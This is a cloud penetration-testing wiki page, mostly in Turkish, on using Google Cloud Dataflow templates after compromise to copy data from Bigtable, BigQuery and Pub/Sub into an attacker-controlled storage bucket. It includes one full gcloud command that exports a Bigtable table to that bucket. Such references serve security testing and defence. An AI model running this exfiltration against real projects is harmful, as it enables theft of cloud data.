# GCP - Dataflow Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Dataflow

Dataflow hakkında daha fazla bilgi için bakınız:

{{#ref}}
../gcp-services/gcp-dataflow-enum.md
{{#endref}}

### Using Dataflow to exfiltrate data from other services

**İzinler:** `dataflow.jobs.create`, `resourcemanager.projects.get`, `iam.serviceAccounts.actAs` (over a SA with access to source and sink)

Dataflow job oluşturma haklarına sahip olduğunuzda, GCP Dataflow template'lerini kullanarak Bigtable, BigQuery, Pub/Sub ve diğer servislerden verileri saldırgan tarafından kontrol edilen GCS bucket'larına aktarabilirsiniz. Bu, Dataflow erişimi elde edildiğinde güçlü bir post-exploitation tekniğidir — örneğin [Dataflow Rider](../gcp-privilege-escalation/gcp-dataflow-privesc.md) yoluyla (pipeline takeover via bucket write).

> [!NOTE]
> Kaynağı okumak ve hedefe yazmak için yeterli izinlere sahip bir service account üzerinde `iam.serviceAccounts.actAs` gerekir. Belirtilmezse varsayılan olarak Compute Engine default SA kullanılır.

#### Bigtable to GCS

Tam desen için bakınız: [GCP - Bigtable Post Exploitation](gcp-bigtable-post-exploitation.md#dump-rows-to-your-bucket) — "Dump rows to your bucket". Şablonlar: `Cloud_Bigtable_to_GCS_Json`, `Cloud_Bigtable_to_GCS_Parquet`, `Cloud_Bigtable_to_GCS_SequenceFile`.

<details>

<summary>Bigtable'ı saldırgan tarafından kontrol edilen bucket'a aktar</summary>
```bash
gcloud dataflow jobs run <job-name> \
--gcs-location=gs://dataflow-templates-us-<REGION>/<VERSION>/Cloud_Bigtable_to_GCS_Json \
--project=<PROJECT> \
--region=<REGION> \
--parameters=bigtableProjectId=<PROJECT>,bigtableInstanceId=<INSTANCE_ID>,bigtableTableId=<TABLE_ID>,filenamePrefix=<PREFIX>,outputDirectory=gs://<YOUR_BUCKET>/raw-json/ \
--staging-location=gs://<YOUR_BUCKET>/staging/
```
</details>

#### BigQuery to GCS

Dataflow şablonları BigQuery verilerini dışa aktarmak için mevcuttur. Hedef formatınıza uygun şablonu (JSON, Avro, vb.) kullanın ve çıktıyı bucket'ınıza yönlendirin.

#### Pub/Sub ve akış kaynakları

Streaming pipeline'ları Pub/Sub'dan (veya diğer kaynaklardan) okuyabilir ve GCS'ye yazabilir. Hedef Pub/Sub subscription'ından okuyan ve kontrolünüzdeki bucket'a yazan bir şablonla bir job başlatın.

## Referanslar

- [Dataflow templates](https://cloud.google.com/dataflow/docs/guides/templates/provided-templates)
- [Control access with IAM (Dataflow)](https://cloud.google.com/dataflow/docs/concepts/security-and-permissions)
- [GCP - Bigtable Post Exploitation](gcp-bigtable-post-exploitation.md)

{{#include ../../../banners/hacktricks-training.md}}
